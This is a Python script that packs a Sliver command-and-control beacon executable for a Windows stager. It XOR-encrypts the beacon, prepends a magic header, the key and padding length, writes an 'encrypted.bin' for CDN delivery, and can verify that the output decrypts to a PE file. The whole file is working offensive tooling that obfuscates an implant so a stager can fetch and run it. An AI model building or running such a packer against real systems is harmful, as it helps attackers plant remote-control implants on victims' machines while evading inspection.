#!/usr/bin/env python3
"""
Sliver Beacon Encryptor - For stager workflow
Encrypts a stage beacon EXE to encrypted.bin format for CDN delivery
Matches the XOR decryption in windows-stager.c
"""

import argparse
import struct
import sys
import os

def xor_encrypt(data, key):
    """XOR encryption/decryption (symmetric) - matches stager"""
    key_len = len(key)
    return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

def encrypt_beacon(input_file, output_file, key_hex=None):
    """
    Encrypt Sliver stage beacon EXE for stager delivery
    
    Format:
    [MAGIC 8 bytes] [KEY_LEN 1 byte] [KEY] [PAD_LEN 4 bytes] [PADDED_PAYLOAD]
    """
    
    # Generate or use provided key (16 bytes for stager)
    if key_hex:
        key = bytes.fromhex(key_hex)
    else:
        key = os.urandom(16)
        print(f"Generated key: {key.hex()}")
    
    if len(key) != 16:
        raise ValueError("Key must be exactly 16 bytes (32 hex chars)")
    
    # Read beacon
    with open(input_file, 'rb') as f:
        beacon = f.read()
    
    print(f"Beacon size: {len(beacon):,} bytes")
    
    # Pad to multiple of 16 bytes (AES block size, even though XOR)
    pad_len = (16 - (len(beacon) % 16)) % 16
    if pad_len:
        beacon += os.urandom(pad_len)
    
    print(f"Padded size: {len(beacon):,} bytes (pad: {pad_len})")
    
    # Encrypt
    encrypted = xor_encrypt(beacon, key)
    
    # Build payload with metadata
    MAGIC = b'SLVRSTG1'  # "Sliver Stager v1"
    key_len = len(key)
    
    payload = (
        MAGIC +                    # 8 bytes magic
        bytes([key_len]) +         # 1 byte key length
        key +                      # 16 bytes key
        struct.pack('<I', pad_len) + # 4 bytes pad length
        encrypted                  # Encrypted + padded beacon
    )
    
    # Write encrypted payload
    with open(output_file, 'wb') as f:
        f.write(payload)
    
    print(f"✓ Encrypted {len(beacon):,} → {len(payload):,} bytes")
    print(f"  Magic: SLVRSTG1")
    print(f"  Key:   {key.hex()}")
    print(f"  Output: {output_file}")
    
    return key.hex()

def verify_encryption(input_file, key_hex):
    """Verify stager can decrypt the file"""
    with open(input_file, 'rb') as f:
        data = f.read()
    
    if data[:8] != b'SLVRSTG1':
        print("✗ Invalid magic header")
        return False
    
    key_len = data[8]
    key = data[9:9+key_len]
    pad_len = struct.unpack('<I', data[9+key_len:13+key_len])[0]
    
    encrypted_payload = data[13+key_len:]
    
    decrypted = xor_encrypt(encrypted_payload, key)
    
    # Remove padding
    if pad_len:
        decrypted = decrypted[:-pad_len]
    
    # Verify PE header
    if decrypted[:2] != b'MZ':
        print("✗ Decrypted data is not valid PE")
        return False
    
    print("✓ Verified: Valid PE header (MZ)")
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypt Sliver beacon for stager")
    parser.add_argument("input", help="Input stage beacon exe (e.g., stage.exe)")
    parser.add_argument("output", help="Output encrypted.bin")
    parser.add_argument("--key", help="32-char hex key (default: random)")
    parser.add_argument("--verify", action="store_true", help="Verify encryption")
    
    args = parser.parse_args()
    
    if args.verify:
        if not args.key:
            print("✗ --key required for verify")
            sys.exit(1)
        verify_encryption(args.input, args.key)
    else:
        key_hex = encrypt_beacon(args.input, args.output, args.key)
        print(f"\nStager XOR key: {key_hex}")
        print(f"Update windows-stager.c: BYTE xorKey[16] = {{ 0x{key_hex[0:2]}, 0x{key_hex[2:4]}, ... }};")
